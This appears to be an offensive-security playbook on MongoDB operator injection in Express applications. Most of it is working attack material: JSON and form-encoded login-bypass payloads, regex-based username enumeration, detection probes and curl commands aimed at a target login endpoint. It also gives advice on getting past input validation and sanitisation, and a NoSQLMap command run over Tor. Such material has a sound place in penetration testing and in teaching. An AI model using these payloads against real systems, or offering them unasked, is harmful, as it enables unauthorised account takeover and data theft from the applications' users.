# MongoDB Operator Injection

## When this applies

- Application accepts user input that is passed directly to a MongoDB query as a JSON object.
- Backends commonly built on Express + Mongoose/MongoClient where `req.body` is splatted into a query: `db.users.find(req.body)`.
- URL-encoded form submissions on Express auto-parse `?username[$ne]=` into `{username: {$ne: ""}}`.

## Technique

Replace a string field with a MongoDB operator object. Operators like `$ne`, `$gt`, `$regex` accept any document where the field exists / matches a pattern, bypassing equality checks used by login/lookup queries.

## Steps

### 1. JSON body operator injection (auth bypass)

```json
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$ne": null}}
```

### 2. URL-encoded operator injection (Express)

```
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

Express's `qs` parser auto-builds nested objects from `[bracket]` notation in query strings AND form bodies.

### 3. Comparison operators

| Operator | Description | Auth-bypass payload |
|---|---|---|
| `$eq` | Equal | `{password: {$eq: anything}}` (rarely useful) |
| `$ne` | Not equal | `{password: {$ne: ""}}` |
| `$gt`, `$gte` | Greater | `{password: {$gt: ""}}` |
| `$lt`, `$lte` | Less | `{password: {$lt: "~~~"}}` |
| `$in` | In array | `{username: {$in: ["admin","root"]}}` |
| `$nin` | Not in | `{password: {$nin: ["wrongpass"]}}` |
| `$exists` | Field exists | `{password: {$exists: true}}` |

### 4. `$regex` for username discovery

When the username field is server-controlled (e.g. login by email):

```json
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
{"username": {"$regex": "admin.*"}, "password": {"$ne": ""}}
```

Bisect the regex pattern to enumerate the first user matching `^[a-z]`, `^[a-l]`, etc.

### 5. Logical operators

```json
{"$or": [{"username": "admin"}, {"role": "admin"}]}
{"$and": [{"username": "admin"}, {"password": {"$ne": ""}}]}
```

### 6. Detect injection without auth

Send a payload that should fail equality but pass operator-injection:

```
?category=test'                         # Syntax error → 500 = vulnerable
?category[$ne]=Gifts                    # Returns ALL non-Gifts → vulnerable
?category[$regex]=.*                    # Returns everything → vulnerable
```

### 7. cURL payloads

```bash
# JSON body
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'

# URL-encoded form
curl -X POST http://target/login \
  -d 'username[$ne]=&password[$ne]='

# Mixed regex
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":"admin"},"password":{"$ne":""}}'
```

## Verifying success

- Response sets a session cookie (`Set-Cookie: connect.sid=...`).
- Response body contains the bypassed user's data (e.g. `Welcome, admin`).
- HTTP 200 instead of 401.
- For detection without bypass: response shape changes (e.g. shows ALL records vs filtered subset).

## Common pitfalls

- Backends using strict input validation (Joi, Yup, Zod) reject non-string fields — operator injection blocked at the schema layer. Test the raw API endpoint, not the validated frontend route.
- `mongo-sanitize` strips keys starting with `$` — operator injection blocked. Switch to syntax injection on string-context queries.
- Some apps wrap input in `String(req.body.password)` — coerces objects to `[object Object]`, breaks injection. Check source before assuming success.
- HTTP method matters: GET with `?[bracket]` works on Express; POST JSON works on raw body parsers. Try both.
- Content-Type matters: `application/json` enables JSON operator object, `application/x-www-form-urlencoded` requires bracket notation.

## Tools

- Burp Suite (manual JSON manipulation in Repeater).
- NoSQLMap (`-u <url> -p username --tor`).
- Custom Python with `requests.post(json={...})`.
- Param-miner / autorize for parameter discovery.
